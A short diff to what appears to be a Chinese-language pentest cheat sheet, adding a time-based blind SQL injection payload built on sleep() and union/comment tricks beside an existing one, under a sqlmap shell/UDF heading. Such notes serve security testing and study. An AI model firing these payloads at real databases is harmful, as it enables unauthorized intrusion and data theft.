@@ -1794,6 +1794,7 @@ init:stop().  //退出Erlang Shell是使用init:stop函数完成的
 ```
 鎈'"\(
 'and(select*from(select+sleep(3))a/**/union/**/select+1)='
+(select*from(select+sleep(2)union/**/select+1)a)
 ```
 ### sqlmap自带shell、udf解码
 
